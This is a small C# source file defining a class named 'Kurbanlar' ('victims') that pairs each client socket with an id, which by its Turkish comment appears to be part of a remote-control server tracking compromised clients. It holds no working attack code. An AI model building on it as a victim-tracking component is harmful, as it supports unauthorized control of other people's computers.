using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net.Sockets;
namespace SV                         //Kurban (Client) bilgilerini tuttuğumuz sınıf. (Her soketi sınıflandırıyoruz ki spesifik olarak işlem
                                    //yapabilelim.
{
    public class Kurbanlar
    {
        public Socket soket;
        public string id;
        public Kurbanlar(Socket s, string ident)
        {
            this.soket = s;
            this.id = ident;
        }
    }
}
